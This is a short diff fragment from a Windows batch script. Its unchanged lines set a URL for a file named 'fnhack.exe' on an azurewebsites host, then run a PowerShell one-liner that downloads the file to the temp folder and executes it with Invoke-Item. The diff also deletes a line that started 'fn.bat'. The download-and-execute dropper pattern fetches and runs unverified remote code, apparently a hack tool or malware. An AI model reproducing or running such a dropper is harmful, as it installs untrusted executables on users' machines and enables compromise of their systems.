@@ -39,5 +39,5 @@ set files= 'http://mogiant.azurewebsites.net/fnhack.exe'
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
 
-start fn.bat
+
 
